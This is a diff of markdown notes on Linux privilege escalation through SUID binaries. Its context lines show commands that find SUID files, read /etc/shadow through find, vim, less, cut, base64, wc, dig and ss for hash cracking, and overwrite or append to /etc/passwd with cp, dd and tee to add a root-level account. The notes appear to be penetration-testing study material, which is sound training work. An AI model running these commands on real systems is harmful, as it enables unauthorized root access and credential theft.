@@ -1,61 +1,6 @@
 
 
-###### Table of Contents
-
-- [Finds Files and Directories with Special Permissions](#Finds%20Files%20and%20Directories%20with%20Special%20Permissions)
-			- [- Finds all files and directories with permissions set to 777 (read, write, execute for owner, group, and others )](#-%20Finds%20all%20files%20and%20directories%20with%20permissions%20set%20to%20777%20(read,%20write,%20execute%20for%20owner,%20group,%20and%20others%20))
-			- [- Finds directories with permissions 1777 (world-writable with the sticky bit set)](#-%20Finds%20directories%20with%20permissions%201777%20(world-writable%20with%20the%20sticky%20bit%20set))
-			- [- Finds files and directories  writable by others](#-%20Finds%20files%20and%20directories%20%20writable%20by%20others)
-			- [- Finds Directories and files which have writable permission](#-%20Finds%20Directories%20and%20files%20which%20have%20writable%20permission)
-			- [- Finds readable directories and files](#-%20Finds%20readable%20directories%20and%20files)
-			- [- Find specific file using -name](#-%20Find%20specific%20file%20using%20-name)
-- [SUID/SGID](#SUID/SGID)
-			- [- Finds files (-type f) with the SUID (Set User ID) bit set (-perm -u=s). The SUID bit allows a file to be executed with the privileges of the file's owner, which is often root, regardless of the user running it.](#-%20Finds%20files%20(-type%20f)%20with%20the%20SUID%20(Set%20User%20ID)%20bit%20set%20(-perm%20-u=s).%20The%20SUID%20bit%20allows%20a%20file%20to%20be%20executed%20with%20the%20privileges%20of%20the%20file's%20owner,%20which%20is%20often%20root,%20regardless%20of%20the%20user%20running%20it.)
-			- [- Similar to the previous command but explicitly looks for files with read (r), write (w) and SUID (s) permissions set for the owner.](#-%20Similar%20to%20the%20previous%20command%20but%20explicitly%20looks%20for%20files%20with%20read%20(r),%20write%20(w)%20and%20SUID%20(s)%20permissions%20set%20for%20the%20owner.)
-			- [- Another way to find SUID files using the octal representation of the SUID bit (04000).](#-%20Another%20way%20to%20find%20SUID%20files%20using%20the%20octal%20representation%20of%20the%20SUID%20bit%20(04000).)
-			- [- Finds directories (-type d) with the SGID (Set Group ID) bit set (-g=rws). The SGID bit on a directory means files created withing it will inherit the directory's group, not the user's primary group.](#-%20Finds%20directories%20(-type%20d)%20with%20the%20SGID%20(Set%20Group%20ID)%20bit%20set%20(-g=rws).%20The%20SGID%20bit%20on%20a%20directory%20means%20files%20created%20withing%20it%20will%20inherit%20the%20directory's%20group,%20not%20the%20user's%20primary%20group.)
-			- [- Finds directories with group read (r), write (w), and SGID (S) permissions. The capital S indicates that the execute bit is not set for the group, but the SGID bit is set.](#-%20Finds%20directories%20with%20group%20read%20(r),%20write%20(w),%20and%20SGID%20(S)%20permissions.%20The%20capital%20S%20indicates%20that%20the%20execute%20bit%20is%20not%20set%20for%20the%20group,%20but%20the%20SGID%20bit%20is%20set.)
-			- [- Finds directories with both the SUID and SGID bits set using octal notation (06000).](#-%20Finds%20directories%20with%20both%20the%20SUID%20and%20SGID%20bits%20set%20using%20octal%20notation%20(06000).)
-- [✅ **Secure SUID Binaries That Do Not Lead to Privilege Escalation**](#%E2%9C%85%20**Secure%20SUID%20Binaries%20That%20Do%20Not%20Lead%20to%20Privilege%20Escalation**)
-	- [List of Secure SUID Binaries in Linux](#List%20of%20Secure%20SUID%20Binaries%20in%20Linux)
-		- [These are common SUID binaries found in Linux systems that are generally considered safe:](#These%20are%20common%20SUID%20binaries%20found%20in%20Linux%20systems%20that%20are%20generally%20considered%20safe:)
-- [Privilege Escalation via SUID](#Privilege%20Escalation%20via%20SUID)
-	- [Steps to Identify and Exploit SUID Files](#Steps%20to%20Identify%20and%20Exploit%20SUID%20Files)
-		- [1. Find SUID Files :](#1.%20Find%20SUID%20Files%20:)
-		- [2. Anylyze SUID Files :](#2.%20Anylyze%20SUID%20Files%20:)
-		- [3. Exploitation Scenarios :](#3.%20Exploitation%20Scenarios%20:)
-			- [3.1 Misconfigured SUID Binaries : if a binary is writable, it can be replaced with a malicious script or binary.](#3.1%20Misconfigured%20SUID%20Binaries%20:%20if%20a%20binary%20is%20writable,%20it%20can%20be%20replaced%20with%20a%20malicious%20script%20or%20binary.)
-		- [4 exploitation of  suid binaries](#4%20exploitation%20of%20%20suid%20binaries)
-			- [4.1 privilege escalation via find suid binary](#4.1%20privilege%20escalation%20via%20find%20suid%20binary)
-			- [4.2 vim /vi/nano](#4.2%20vim%20/vi/nano)
-			- [4.3 less / more](#4.3%20less%20/%20more)
-			- [4.4 cp](#4.4%20cp)
-			- [4.5  file , date](#4.5%20%20file%20,%20date)
-			- [4.6 dd](#4.6%20dd)
-			- [4.7 cut](#4.7%20cut)
-			- [4.8 base64](#4.8%20base64)
-			- [4.9 wc](#4.9%20wc)
-			- [4.10 dig](#4.10%20dig)
-			- [4.11 ss](#4.11%20ss)
-			- [4.12 tee](#4.12%20tee)
-- [Custom binary](#Custom%20binary)
-	- [1. make custom binary](#1.%20make%20custom%20binary)
-	- [2. Compiling and Setting SUID Bit](#2.%20Compiling%20and%20Setting%20SUID%20Bit)
-		- [2.1 Compile the binary](#2.1%20Compile%20the%20binary)
-		- [2.2 Set the SUID bit](#2.2%20Set%20the%20SUID%20bit)
-		- [2.3 Change ownership to root](#2.3%20Change%20ownership%20to%20root)
-		- [2.4 Verify SUID bit](#2.4%20Verify%20SUID%20bit)
-	- [3. Exploiting the SUID Binary for Privilege Escalation](#3.%20Exploiting%20the%20SUID%20Binary%20for%20Privilege%20Escalation)
-		- [3.1 Check the custom binary permissions](#3.1%20Check%20the%20custom%20binary%20permissions)
-		- [3.2 Run the binary and observe the output](#3.2%20Run%20the%20binary%20and%20observe%20the%20output)
-		- [3.3 Analyze the user_id binary](#3.3%20Analyze%20the%20user_id%20binary)
-		- [4 Check path variable and whoami binary](#4%20Check%20path%20variable%20and%20whoami%20binary)
-		- [5 PATH manipulation / hijacking](#5%20PATH%20manipulation%20/%20hijacking)
-			- [Add PATH into PATH variable](#Add%20PATH%20into%20PATH%20variable)
-		- [6 create whoami binary into /tmp](#6%20create%20whoami%20binary%20into%20/tmp)
-		- [Run custom binary](#Run%20custom%20binary)
-
-
+# Privilege Escalation via SUID
 
 ### Finds Files and Directories with Special Permissions
 
@@ -175,7 +120,9 @@ find / -type f -perm -u=s 2>dev/null
 
 ##### 2. Anylyze SUID Files :
 - Check the purpose of the SUID file.
-	- ```find / -type f -perm -u=rws 2>/dev/null
+ ```bash
+   find / -type f -perm -u=rws 2>/dev/null
+ ```
 - Determine if the file is writable or vulnerable.
 ##### 3. Exploitation Scenarios :
 ###### 3.1 Misconfigured SUID Binaries : if a binary is writable, it can be replaced with a malicious script or binary.
@@ -190,7 +137,10 @@ cat /usr/NX/scripts/restricted/nxlicense.sh    # verifying contain is write or n
 ```
 
 
-##### 4 exploitation of  suid binaries 
+#### 4 exploitation of  suid binaries 
+</br>
+</br>
+
 ###### 4.1 privilege escalation via find suid binary
 check suid permissions
 ```bash
@@ -228,6 +178,7 @@ cat /etc/shadow
 
 ![](Attachments/Pasted%20image%2020250222094208.png)
 
+---
 
 ###### 4.2 vim /vi/nano
 check permissions
@@ -258,6 +209,7 @@ vim /etc/shadow
 
 **Note :- when you are trying to save this file it will give error so for save file use *wq!***
 
+---
 
 ###### 4.3 less / more 
 check the permissions 
@@ -275,7 +227,7 @@ less /etc/shadow
 
 ![](Attachments/Pasted%20image%2020250222105244.png)
 
-
+---
 
 ###### 4.4 cp 
 check the permissions
@@ -298,6 +250,7 @@ When you found suid on cp binary the don't cp /etc/passwd file on /tmp location 
 Or After copy /etc/passwd  or /etc/shadow file you can edit it and 
 Then again using cp command replace with original file 
 
+---
 
 ###### 4.5  file , date 
 check permissions 
@@ -312,6 +265,7 @@ Read the /etc/shadow file copy the password hash and crack
 file -f /etc/shadow
 ```
 
+---
 
 ###### 4.6 dd
 check permissions
@@ -342,6 +296,7 @@ Then login with new added user
 su root
 ```
 
+---
 
 ###### 4.7 cut
 check permissions
@@ -352,6 +307,7 @@ Then read the /etc/shadow file and then crack the password hash
 cut -f1- -d: /etc/shadow 
 ```
 
+---
 
 ###### 4.8 base64
 check permissions
@@ -364,6 +320,7 @@ base64 /etc/shadow | base64 --decode
 
 your will get password hash
 
+---
 
 ###### 4.9 wc
 check permissions 
@@ -376,6 +333,7 @@ wc --files0-from=/etc/shadow
 
 grep password of hash and crack it
 
+---
 
 ###### 4.10 dig
 
@@ -386,6 +344,7 @@ Read /etc/shadow file
 dig -f /etc/shadow 
 ```
 
+---
 
 ###### 4.11 ss
 
@@ -396,6 +355,7 @@ ss -a -F /etc/shadow
 
 It will read only one line 
 
+---
 
 ###### 4.12 tee
 edit file using tee
@@ -406,7 +366,7 @@ echo 'root1:$1$NBIvZax5$jv3IXEGcWtVxsfayNTv9B0:0:0:root:/root:/bin/bash' | tee -
 It will append the provided contain into /etc/passwd file 
 
 
-
+---
 
 ### Custom binary
 #### 1. make custom binary
